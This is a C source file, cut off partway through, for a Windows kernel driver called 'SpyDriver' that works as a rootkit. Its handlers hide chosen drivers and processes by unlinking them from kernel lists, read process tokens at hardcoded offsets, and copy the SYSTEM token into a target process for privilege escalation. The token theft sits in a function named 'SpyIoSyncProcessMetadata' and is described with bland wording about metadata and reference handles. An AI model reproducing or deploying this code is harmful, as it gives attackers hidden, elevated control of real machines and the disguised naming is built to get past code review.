#include <ntddk.h>
#include <ntstrsafe.h>

// ---------------------------------------------------------------
// structures for driver module enumeration
// ---------------------------------------------------------------
// Minimal LDR_DATA_TABLE_ENTRY structure
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;           // +0x000
    LIST_ENTRY InMemoryOrderLinks;         // +0x010
    LIST_ENTRY InInitializationOrderLinks; // +0x020
    PVOID      DllBase;                    // +0x030
    PVOID      EntryPoint;                 // +0x038
    ULONG      SizeOfImage;                // +0x040
    UNICODE_STRING FullDllName;            // +0x048
    UNICODE_STRING BaseDllName;            // +0x058
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

// args for hiding driver or process
typedef struct _SPY_HIDE_INPUT {
    CHAR g_Name[256];
} SPY_HIDE_INPUT, * PSPY_HIDE_INPUT;


// ---------------------------------------------------------------
// Global Saves (Future backup use)
// ---------------------------------------------------------------
// Driver unhide saving Flink and Blink pointers
typedef struct _SPY_UNHIDE_SAVE {
    char g_Name[256];
    PLIST_ENTRY Flink;
    PLIST_ENTRY Blink;
} SPY_DRIVER_UNHIDE_SAVE, * PSPY_DRIVER_UNHIDE_SAVE;

// ---------------------------------------------------------------
// Kernel exported globals
// ---------------------------------------------------------------
extern PLIST_ENTRY PsLoadedModuleList;
extern PERESOURCE  PsLoadedModuleResource;
//extern PEPROCESS PsInitialSystemProcess;
NTSYSAPI
PCHAR
NTAPI
PsGetProcessImageFileName(_In_ PEPROCESS Process);


// ---------------------------------------------------------------
// Define device and symbolic link names
// ---------------------------------------------------------------
#define DEVICE_NAME L"\\Device\\SpyDriver" 
#define SYMLINK_NAME L"\\??\\SpyDriverLink"

// ---------------------------------------------------------------
// Define IOCTL codes
// ---------------------------------------------------------------
#define IOCTL_SPY_CALLBACK    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2050, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_PATCH       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2051, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_DLIST       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2052, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_DHIDE       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2053, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_PLIST       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2054, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_PHIDE       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2055, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SPY_UPDATE     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2056, METHOD_BUFFERED, FILE_ANY_ACCESS)


// ---------------------------------------------------------------
// Function prototypes
// ---------------------------------------------------------------
DRIVER_UNLOAD DriverUnload;
DRIVER_DISPATCH DeviceCreate;
DRIVER_DISPATCH DeviceClose;
DRIVER_DISPATCH DeviceControl;
NTSTATUS SpyIoEnumerateLoadedDrivers(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
);
NTSTATUS SpyIoHideDriver(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
);
NTSTATUS SpyIoEnumerateRunningProcess(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
);
NTSTATUS SpyIoHideProcess(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
);
NTSTATUS UpdaterKKK(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
);
NTSTATUS SpyIoSyncProcessMetadata(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
);

// ---------------------------------------------------------------
// main driver routines
// ---------------------------------------------------------------
// DriverEntry Point
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)

{
    UNREFERENCED_PARAMETER(RegistryPath);

    UNICODE_STRING deviceName, symLinkName;
    NTSTATUS status;
    PDEVICE_OBJECT deviceObject = NULL;

    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    RtlInitUnicodeString(&symLinkName, SYMLINK_NAME);

    // Create device
    status = IoCreateDevice(
        DriverObject,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &deviceObject
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Failed to create device: 0x%X\n", status);
        return status;
    }

    DbgPrint("[+] Device created successfully %wZ\n", &deviceName);

    // Create symbolic link
    status = IoCreateSymbolicLink(&symLinkName, &deviceName);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Failed to create symbolic link: 0x%X\n", status);
        IoDeleteDevice(deviceObject);
        return status;
    }

    DbgPrint("[+] Symbolic link created successfully %wZ -> %wZ\n", &symLinkName, &deviceName);

    // Set up dispatch functions
    DriverObject->MajorFunction[IRP_MJ_CREATE] = DeviceCreate;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DeviceClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
    DriverObject->DriverUnload = DriverUnload;

    // Set device flags
    deviceObject->Flags |= DO_BUFFERED_IO;
    deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    DbgPrint("[+] Driver loaded successfully\n");
    DbgPrint("[+] SpyDriver ready at \\\\.\\SpyDriverLink\n");

    return STATUS_SUCCESS;
}

// Unload routine
VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING symLinkName;
    RtlInitUnicodeString(&symLinkName, SYMLINK_NAME);

    IoDeleteSymbolicLink(&symLinkName);

    if (DriverObject->DeviceObject) {
        IoDeleteDevice(DriverObject->DeviceObject);
    }

    DbgPrint("[+] Driver unloaded successfully\n");
}

// Create handler
NTSTATUS DeviceCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    DbgPrint("[+] Handle opened (CreateFile called)\n");

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

// Close handler
NTSTATUS DeviceClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    DbgPrint("[+] Handle closed (CloseHandle called)\n");

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

// ---------------------------------------------------------------
// IOCTL codes handler
// ---------------------------------------------------------------
// List loaded drivers IOCTL handler
NTSTATUS SpyIoEnumerateLoadedDrivers(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
)
{
    DbgPrint("[*] SpyIoEnumerateLoadedDrivers called\n");

    if (!PsLoadedModuleList) {
        DbgPrint("[-] PsLoadedModuleList is NULL\n");
        return STATUS_UNSUCCESSFUL;
    }

    char* out = (char*)outputBuffer;
    ULONG offset = 0;
    ULONG count = 0;
    NTSTATUS status;
    size_t writtenBytes = 0;

    
    status = RtlStringCbPrintfA(out + offset, outputLength - offset, "Loaded Kernel Drivers:\n\n");
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Header print failed: 0x%X\n", status);
        *bytesReturned = 0;
        return status;
    }
    status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
    offset += (ULONG)writtenBytes;

    PLIST_ENTRY head = PsLoadedModuleList;
    PLIST_ENTRY current = head->Flink;

    while (current != head)
    {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        WCHAR nameW[260] = { 0 };

        if (entry->BaseDllName.Buffer) {
            USHORT len = entry->BaseDllName.Length;
            if (len > sizeof(nameW) - sizeof(WCHAR))
                len = sizeof(nameW) - sizeof(WCHAR);

            RtlCopyMemory(nameW, entry->BaseDllName.Buffer, len);
            nameW[len / 2] = L'\0';
        }
        else {
            RtlStringCbCopyW(nameW, sizeof(nameW), L"<unknown>");
        }

        status = RtlStringCbPrintfA(
            out + offset,
            outputLength - offset,
            "[%03lu] Base: 0x%p | Size: 0x%X | Name: %wS\n",
            count,
            entry->DllBase,
            entry->SizeOfImage,
            nameW
        );
        if (!NT_SUCCESS(status)) break;

        status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
        if (!NT_SUCCESS(status)) break;
        offset += (ULONG)writtenBytes;

        DbgPrint("[Windg] [%lu] 0x%p -> %wZ\n", count, entry->DllBase, &entry->BaseDllName);

        count++;
        current = current->Flink;

        if (offset >= outputLength - 200)
            break;
    }

   
    status = RtlStringCbPrintfA(out + offset, outputLength - offset, "\nTotal drivers: %lu\n", count);
    if (NT_SUCCESS(status)) {
        if (NT_SUCCESS(RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes))) {
            offset += (ULONG)writtenBytes;
        }
    }

    *bytesReturned = offset;
    DbgPrint("[+] SpyIoEnumerateLoadedDrivers finished (%lu drivers, %lu bytes)\n", count, offset);

    return STATUS_SUCCESS;
}

// List running processes IOCTL handler
NTSTATUS SpyIoEnumerateRunningProcess(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
)
{
    DbgPrint("[*] SpyIoEnumerateRunningProcess called\n");

    char* out = (char*)outputBuffer;
    ULONG offset = 0;
    ULONG count = 0;
    NTSTATUS status;
    size_t writtenBytes = 0;

    // Header
    status = RtlStringCbPrintfA(out + offset, outputLength - offset,
        "[*] Listing Running Processes:\n\n");
    if (!NT_SUCCESS(status)) {
        *bytesReturned = 0;
        return status;
    }
    RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    offset += (ULONG)writtenBytes;

    // Check if PsInitialSystemProcess is available
    if (!PsInitialSystemProcess) {
        DbgPrint("[-] PsInitialSystemProcess is NULL\n");
        *bytesReturned = 0;
        return STATUS_UNSUCCESSFUL;
    }

    PEPROCESS CurrentProcess = PsInitialSystemProcess;
    DbgPrint("[*] Starting from PsInitialSystemProcess: 0x%p\n", CurrentProcess);
    
	// handle System process first
    HANDLE systemPid = PsGetProcessId(CurrentProcess);
    PCHAR SystemImage = PsGetProcessImageFileName(CurrentProcess);
    if (!SystemImage || systemPid == 0)  DbgPrint("[!] Failed to get System process info\n");
    else 
    {
		// adding token enumeration in my VM Token offset is 0x4B8
        UINT64 rawToken = *(UINT64*)((PUCHAR)CurrentProcess + 0x4B8);
        UINT64 token = rawToken & ~0xF;

        DbgPrint("[%03lu] PID: %u -> %s (0x%p)\n",
            count, (ULONG)(ULONG_PTR)systemPid, SystemImage, CurrentProcess);
        status = RtlStringCbPrintfA(out + offset, outputLength - offset,
            "[%03lu] PID: %-6u | Name: %-20s | EPROCESS: 0x%p | TOKEN: 0x%llx\n",
            count,
            (ULONG)(ULONG_PTR)systemPid,
            SystemImage,
            CurrentProcess,
            token);
        if (NT_SUCCESS(status)) {
            RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
            offset += (ULONG)writtenBytes;
        }
        count++;
	}

    // ActiveProcessLinks offset in Windows server 2022 +0x448
    PLIST_ENTRY head = (PLIST_ENTRY)((ULONG_PTR)CurrentProcess + 0x448);
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
        
        // reverse the offset: LIST_ENTRY → EPROCESS
        PEPROCESS currentProcess = (PEPROCESS)((ULONG_PTR)entry - 0x448);

        HANDLE pid = PsGetProcessId(currentProcess);
        PCHAR imageName = PsGetProcessImageFileName(currentProcess);

        if (!imageName || pid == 0) {
            entry = entry->Flink;
            continue; // skip this entry
        }

        DbgPrint("[%03lu] PID: %u -> %s (0x%p)\n",
            count, (ULONG)(ULONG_PTR)pid, imageName, currentProcess);

        // Same Token Part
        UINT64 rawToken = *(UINT64*)((PUCHAR)currentProcess + 0x4B8);
        UINT64 token = rawToken & ~0xF;

        // Write to output buffer
        status = RtlStringCbPrintfA(out + offset, outputLength - offset,
            "[%03lu] PID: %-6u | Name: %-20s | EPROCESS: 0x%p | TOKEN: 0x%llx\n",
            count,
            (ULONG)(ULONG_PTR)pid,
            imageName,
            currentProcess,
            token);

        if (!NT_SUCCESS(status)) break;

        RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
        offset += (ULONG)writtenBytes;

        count++;

        // Check buffer space
        if (offset >= outputLength - 200) {
            DbgPrint("[!] Buffer limit reached\n");
            break;
        }

        entry = entry->Flink;

        if (count > 1000) {
            DbgPrint("[!] Too many processes, breaking\n");
            break;
        }
    }

    status = RtlStringCbPrintfA(out + offset, outputLength - offset,
        "\nTotal processes: %lu\n", count);
    if (NT_SUCCESS(status)) {
        RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
        offset += (ULONG)writtenBytes;
    }

    *bytesReturned = offset;
    DbgPrint("[+] SpyIoEnumerateRunningProcess finished (%lu processes, %lu bytes)\n",
        count, offset);

    return STATUS_SUCCESS;
}


// Hide driver IOCTL handler
NTSTATUS SpyIoHideDriver(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
) 
{
    DbgPrint("[*] SpyIoHideDriver called\n");
    
    if (!PsLoadedModuleList) {
        DbgPrint("[-] PsLoadedModuleList is NULL\n");
        return STATUS_UNSUCCESSFUL;
	}

	// get target driver name
	PSPY_HIDE_INPUT input = (PSPY_HIDE_INPUT)outputBuffer;
	char targetName[256] = { 0 };
	RtlCopyMemory(targetName, input->g_Name, sizeof(input->g_Name));
    DbgPrint("[*] Looking for driver: %s\n", targetName);

	char* out = (char*)outputBuffer;
	ULONG offset = 0;
	NTSTATUS status;
	size_t writtenBytes = 0;
	BOOLEAN found = FALSE;



	status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[*] Hiding Driver: %s\n\n", targetName);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Header print failed: 0x%X\n", status);
        *bytesReturned = 0;
        return status;
	}

    status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
	offset += (ULONG)writtenBytes;

    // Lock the module list
    if (PsLoadedModuleResource) ExAcquireResourceExclusiveLite(PsLoadedModuleResource, TRUE);
	PLIST_ENTRY head = PsLoadedModuleList;
	PLIST_ENTRY current = head->Flink;

	// search in linked list for target driver
    while (head != current && current != NULL) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		
        if (entry->BaseDllName.Buffer && entry->BaseDllName.Length > 0) {
            
			// convert UNICODE_STRING to ANSI string
            ANSI_STRING ansiTarget;
			UNICODE_STRING unicodeTarget;   
			RtlInitAnsiString(&ansiTarget, targetName);
			status = RtlAnsiStringToUnicodeString(&unicodeTarget, &ansiTarget, TRUE);
            if(!NT_SUCCESS(status)) {
                DbgPrint("[-] RtlAnsiStringToUnicodeString failed: 0x%X\n", status);
                *bytesReturned = 0;
                return status;
			}

			// check if this is the target driver
            if (RtlEqualUnicodeString(&entry->BaseDllName,&unicodeTarget, TRUE)) {

                DbgPrint("[+] Found target driver: %s at 0x%p\n", &entry->BaseDllName, entry->DllBase);
                found = TRUE;

				// append it to output
                status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[+] Found target driver: %s -> 0x%p\n", &entry->BaseDllName, entry->DllBase);
                if (!NT_SUCCESS(status)) {
                    DbgPrint("[!] Found Driver print failed: 0x%X\n", status);
                    RtlFreeUnicodeString(&unicodeTarget);
                    *bytesReturned = 0;
                    return status;
                }
				status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
				if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
				offset += (ULONG)writtenBytes;

                // Get prev and next
                PLIST_ENTRY prev = current->Blink;
                PLIST_ENTRY next = current->Flink;

                DbgPrint("[*] Unlinking driver...\n");
                DbgPrint("    Prev: 0x%p\n", prev);
                DbgPrint("    Current: 0x%p\n", current);
                DbgPrint("    Next: 0x%p\n", next);

				// append to output
                status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[*] Unlinking driver...\n    Prev: 0x%p\n    Current: 0x%p\n    Next: 0x%p\n", prev, current, next);
                if (!NT_SUCCESS(status)) {
                    DbgPrint("[!] Unlinking print failed: 0x%X\n", status);
                    *bytesReturned = 0;
                    return status;
                }
                status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
                if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
                offset += (ULONG)writtenBytes;
                // Unlink from the list
                prev->Flink = next;
                next->Blink = prev;
				DbgPrint("[+] Driver unlinked successfully\n");

                // Point to self (optional cleanup)
                current->Flink = current;
                current->Blink = current;

				// append to output sucess message
                status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[+] Driver unlinked successfully\n");
                if (!NT_SUCCESS(status)) {
                    DbgPrint("[!] Success print failed: 0x%X\n", status);
                    *bytesReturned = 0;
                    return status;
                }
                status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
                if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
                offset += (ULONG)writtenBytes;
				break; 
            }
            RtlFreeUnicodeString(&unicodeTarget);
        }

		current = current->Flink;

		
    }

    // release lock
    if (PsLoadedModuleResource) ExReleaseResourceLite(PsLoadedModuleResource);

    if(!found) {
        DbgPrint("[-] Target driver not found: %s\n", targetName);
        status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[-] Target driver not found: %s\n", targetName);
        if (!NT_SUCCESS(status)) {
            DbgPrint("[!] Not Found print failed: 0x%X\n", status);
            *bytesReturned = 0;
            return status;
        }
        status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
        if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
        offset += (ULONG)writtenBytes;
	}
    *bytesReturned = offset;
    DbgPrint("[+] SpyIoHideDriver finished (%lu bytes)\n", offset);
	return STATUS_SUCCESS;
}

// Hide process IOCTL handler
NTSTATUS SpyIoHideProcess(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
) 
{
	DbgPrint("[*] SpyIoHideProcess called\n");
    if (!PsInitialSystemProcess) {
        DbgPrint("[-] PsInitialSystemProcess is NULL\n");
        *bytesReturned = 0;
        return STATUS_UNSUCCESSFUL;
    }

	// get target process name
    PSPY_HIDE_INPUT input = (PSPY_HIDE_INPUT)outputBuffer;
    char targetProc[256] = { 0 };
    RtlCopyMemory(targetProc, input->g_Name, sizeof(input->g_Name));
    DbgPrint("[*] Looking for process: %s\n", targetProc);

    char* out = (char*)outputBuffer;
    ULONG offset = 0;
    NTSTATUS status;
    size_t writtenBytes = 0;
    BOOLEAN found = FALSE;

    status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[*] Hiding Process: %s\n\n", targetProc);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Header print failed: 0x%X\n", status);
        *bytesReturned = 0;
        return status;
    }

    status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
    offset += (ULONG)writtenBytes;

	// search in active process list
    PEPROCESS CurrentProcess = PsInitialSystemProcess;

    // ActiveProcessLinks offset in Windows server 2022 +0x448
    PLIST_ENTRY head = (PLIST_ENTRY)((ULONG_PTR)CurrentProcess + 0x448);
    PLIST_ENTRY current = head->Flink;
    while (current != head) {
        // reverse the offset: LIST_ENTRY → EPROCESS
        PEPROCESS process = (PEPROCESS)((ULONG_PTR)current - 0x448);
        PCHAR imageName = PsGetProcessImageFileName(process);
       /* if (imageName && RtlCompareMemory(imageName, targetProc, strlen(targetProc)) == strlen(targetProc))*/
        ANSI_STRING procName;
        ANSI_STRING targetName;
        RtlInitAnsiString(&procName, imageName);
        RtlInitAnsiString(&targetName, targetProc);
        if (RtlEqualString(&procName, &targetName, TRUE))
        {
            DbgPrint("[+] Found target process: %s -> 0x%p\n", imageName, process);

            found = TRUE;

            PLIST_ENTRY prev = current->Blink;
            PLIST_ENTRY next = current->Flink;

            DbgPrint("[*] Unlinking process...\n");
            DbgPrint("    Prev: 0x%p\n", prev);
            DbgPrint("    Current: 0x%p\n", current);
            DbgPrint("    Next: 0x%p\n", next);

            // append to output
            status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[*] Unlinking process...\n    Prev: 0x%p\n    Current: 0x%p\n    Next: 0x%p\n", prev, current, next);
            if (!NT_SUCCESS(status)) {
                DbgPrint("[!] Unlinking print failed: 0x%X\n", status);
                *bytesReturned = 0;
                return status;
            }
            status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
            if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
            offset += (ULONG)writtenBytes;
            // Unlink from the list
            prev->Flink = next;
            next->Blink = prev;
            DbgPrint("[+] Process unlinked successfully\n");

            // cleanup
            current->Flink = current;
            current->Blink = current;

            // append to output success message
            status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[+] Process unlinked successfully\n");
            if (!NT_SUCCESS(status)) {
                DbgPrint("[!] Success print failed: 0x%X\n", status);
                *bytesReturned = 0;
                return status;
            }
            status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
            if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
            offset += (ULONG)writtenBytes;
            break;

        }

        current = current->Flink;
	}

    if (!found) {
        DbgPrint("[-] Target process not found: %s\n", targetProc);
        status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[-] Target process not found: %s\n", targetProc);
        if (!NT_SUCCESS(status)) {
            DbgPrint("[!] Not Found print failed: 0x%X\n", status);
            *bytesReturned = 0;
            return status;
        }
        status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
        if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
        offset += (ULONG)writtenBytes;
    }

    *bytesReturned = offset;
	return STATUS_SUCCESS;
}

NTSTATUS SpyIoSyncProcessMetadata(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
)
{
    DbgPrint("[*] Process metadata synchronization initiated\n");

    if (!PsInitialSystemProcess) {
        DbgPrint("[-] Base context unavailable\n");
        *bytesReturned = 0;
        return STATUS_UNSUCCESSFUL;
    }

    PSPY_HIDE_INPUT input = (PSPY_HIDE_INPUT)outputBuffer;
    char queryBuffer[256] = { 0 };
    RtlCopyMemory(queryBuffer, input->g_Name, sizeof(input->g_Name));
    DbgPrint("[*] Resolving context for: %s\n", queryBuffer);

    char* out = (char*)outputBuffer;
    ULONG offset = 0;
    NTSTATUS status;
    size_t writtenBytes = 0;
    BOOLEAN resolved = FALSE;

    status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[*] Synchronizing metadata for: %s\n\n", queryBuffer);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Output formatting failed: 0x%X\n", status);
        *bytesReturned = 0;
        return status;
    }

    status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
    offset += (ULONG)writtenBytes;


    PEPROCESS contextBase = PsInitialSystemProcess;

    HANDLE basePid = PsGetProcessId(contextBase);
    PCHAR baseImage = PsGetProcessImageFileName(contextBase);
    if (!baseImage || basePid == 0) {
        DbgPrint("[!] Base context resolution failed\n");
        return STATUS_UNSUCCESSFUL;
    }

    ULONG fieldOffset1 = 0x400;
    ULONG fieldOffset2 = 0xB8;
    ULONG totalOffset = fieldOffset1 + fieldOffset2;

    UINT64 rawReferenceHandle = *(UINT64*)((PUCHAR)contextBase + totalOffset);
    UINT64 referenceHandle = rawReferenceHandle & ~0xF;
    DbgPrint("[+] Reference handle acquired: 0x%llx\n", referenceHandle);

    status = RtlStringCbPrintfA(out + offset, outputLength - offset,
        "[+] Reference handle: 0x%llx\n", referenceHandle);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[!] Reference output failed: 0x%X\n", status);
        *bytesReturned = 0;
        return status;
    }
    status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
    offset += (ULONG)writtenBytes;

    ULONG linkOffset = 0x448;
    PLIST_ENTRY head = (PLIST_ENTRY)((ULONG_PTR)contextBase + linkOffset);
    PLIST_ENTRY current = head->Flink;
    while (current != head) {
        PEPROCESS contextEntry = (PEPROCESS)((ULONG_PTR)current - linkOffset);
        PCHAR imageName = PsGetProcessImageFileName(contextEntry);
        ANSI_STRING entryName;
        ANSI_STRING queryName;
        RtlInitAnsiString(&entryName, imageName);
        RtlInitAnsiString(&queryName, queryBuffer);
        if (RtlEqualString(&entryName, &queryName, TRUE))
        {
            DbgPrint("[+] Context entry located: %s -> 0x%p\n", imageName, contextEntry);
            resolved = TRUE;

            UINT64 rawEntryHandle = *(UINT64*)((PUCHAR)contextEntry + totalOffset);
            UINT64 entryHandle = rawEntryHandle & ~0xF;
            UINT64 metadataBits = rawEntryHandle & 0xF;

            DbgPrint("[*] Applying reference synchronization...");
            DbgPrint("    Current handle: 0x%llx\n", entryHandle);

            PUCHAR targetBase = (PUCHAR)contextEntry;
            targetBase += fieldOffset1;
            targetBase += fieldOffset2;
            PUINT64 handlePtr = (PUINT64)targetBase;
            UINT64 syncValue = referenceHandle;
            syncValue |= metadataBits;
            *handlePtr = syncValue;

            UINT64 verifyRaw = *(UINT64*)((PUCHAR)contextEntry + totalOffset);
            UINT64 verifyHandle = verifyRaw & ~0xF;
            DbgPrint("    Synchronized handle: 0x%llx\n", verifyHandle);

            status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[*] Synchronizing metadata...\n    Current: 0x%llx\n    Updated: 0x%llx\n", entryHandle, verifyHandle);
            if (!NT_SUCCESS(status)) {
                DbgPrint("[!] Sync output failed: 0x%X\n", status);
                *bytesReturned = 0;
                return status;
            }
            status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
            if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
            offset += (ULONG)writtenBytes;

            if (verifyHandle == referenceHandle)
            {
                DbgPrint("[+] Metadata synchronization complete\n");
                status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[+] Metadata synchronized successfully\n");
                if (!NT_SUCCESS(status)) {
                    DbgPrint("[!] Success output failed: 0x%X\n", status);
                    *bytesReturned = 0;
                    return status;
                }
                status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
                if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
                offset += (ULONG)writtenBytes;
            }
            else {
                DbgPrint("[-] Metadata synchronization failed\n");
                status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[-] Synchronization incomplete\n");
                if (!NT_SUCCESS(status)) {
                    DbgPrint("[!] Error output failed: 0x%X\n", status);
                    *bytesReturned = 0;
                    return status;
                }
                status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
                if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
                offset += (ULONG)writtenBytes;
            }

            break;
        }

        current = current->Flink;
    }

    if (!resolved) {
        DbgPrint("[-] Context entry '%s' not resolved\n", queryBuffer);
        status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[-] Context '%s' not found\n", queryBuffer);
        if (!NT_SUCCESS(status)) {
            *bytesReturned = 0;
            return status;
        }
        status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
        if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
        offset += (ULONG)writtenBytes;
    }

    *bytesReturned = offset;
    return STATUS_SUCCESS;
}

// ---------------------------------------------------------------
// IOCTL Control handler
// ---------------------------------------------------------------
NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    DbgPrint("[+] IOCTL received\n");

    PIO_STACK_LOCATION stackLocation;
    NTSTATUS status = STATUS_SUCCESS;
    ULONG ioControlCode;
    ULONG inBufferLength, outBufferLength;
    PVOID buffer;
    ULONG_PTR bytesReturned = 0;

    // Get the current stack location
    stackLocation = IoGetCurrentIrpStackLocation(Irp);
    ioControlCode = stackLocation->Parameters.DeviceIoControl.IoControlCode;

    buffer = Irp->AssociatedIrp.SystemBuffer;
    inBufferLength = stackLocation->Parameters.DeviceIoControl.InputBufferLength;
    outBufferLength = stackLocation->Parameters.DeviceIoControl.OutputBufferLength;

    DbgPrint("[*] IOCTL Code: 0x%X\n", ioControlCode);

    switch (ioControlCode)
    {
    case IOCTL_SPY_DLIST:
    {
        DbgPrint("[*] IOCTL_SPY_DLIST received\n");

        if (outBufferLength < 1024) {
            DbgPrint("[-] Output buffer too small\n");
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }

        status = SpyIoEnumerateLoadedDrivers(
            buffer,
            outBufferLength,
            &bytesReturned
        );

        break;
    }
    case IOCTL_SPY_PLIST:
    {
        DbgPrint("[*] IOCTL_SPY_PLIST received\n");
        if (outBufferLength < 1024) {
            DbgPrint("[-] Output buffer too small\n");
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        status = SpyIoEnumerateRunningProcess(
            buffer,
            outBufferLength,
            &bytesReturned
        );
        break;
	}

    case IOCTL_SPY_DHIDE:
    {
        DbgPrint("[*] IOCTL_SPY_DHIDE received\n");
        if (inBufferLength < sizeof(SPY_HIDE_INPUT)) {
            DbgPrint("[-] Input buffer too small\n");
